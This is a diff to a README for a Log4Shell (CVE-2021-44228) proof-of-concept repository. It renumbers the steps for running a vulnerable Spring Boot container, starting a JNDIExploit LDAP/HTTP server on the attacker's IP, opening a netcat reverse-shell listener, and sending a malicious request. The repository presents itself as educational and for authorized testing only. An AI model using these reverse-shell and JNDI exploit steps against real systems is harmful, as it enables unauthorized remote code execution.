@@ -8,34 +8,28 @@ In this repository we have made and example vulnerable application and proof-of-
 
 ## Proof-of-concept (POC)
 
-#### Step 1 : Clone required repository
-
-```bash
-git clone https://github.com/christophetd/log4shell-vulnerable-app.git
-git clone https://github.com/black9/Log4shell_JNDIExploit.git
-```
-
-#### Step 2 : Run Docker File which Include SpringBoot Vulnerable Application
+#### Step 1 : Run Docker File which Include SpringBoot Vulnerable Application
 
 ```bash
 cd log4shell-vulnerable-app
 sudo docker run --rm -it -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
+cd ..
 ```
 
-#### Step 3 : Run the LDAP Server and Http Server
+#### Step 2 : Run the LDAP Server and Http Server
 
 ```bash
 cd Log4shell_JNDIExploit
 java -jar JNDIExploit-1.2-SNAPSHOT.jar -i <Your Attacking Machine IP>
 ```
 
-#### Step 4 : Run the netcat Listner where you get reverse shell
+#### Step 3 : Run the netcat Listner where you get reverse shell
 
 ```bash
 nc -lvp <Port you want for Listner>
 ```
 
-#### Step 5 Curl the Application with Malicious Code
+#### Step 4 Curl the Application with Malicious Code
 
 ```bash
 [+] Step 1 : goto https://ssl-proxy.my-addr.org/myaddrproxy.php/https/www.revshells.com/
@@ -55,3 +49,11 @@ nc -lvp <Port you want for Listner>
 This repository is not intended to be a one-click exploit to CVE-2021-44228. The purpose of this project is to help people learn about this awesome vulnerability, and perhaps test their own applications (however there are better applications for this purpose, ei: https://log4shell.tools/).
 
 Our team will not aid, or endorse any use of this exploit for malicious activity, thus if you ask for help you may be required to provide us with proof that you either own the target service or you have permissions to pentest on it.
+
+## Reference
+
+[log4shell-vulnerable-app] by christophetd</br>
+[Log4shell_JNDIExploit] re-uploaded by black9
+
+[log4shell-vulnerable-app]: https://github.com/christophetd/log4shell-vulnerable-app
+[log4shell_jndiexploit]: https://github.com/black9/Log4shell_JNDIExploit.git
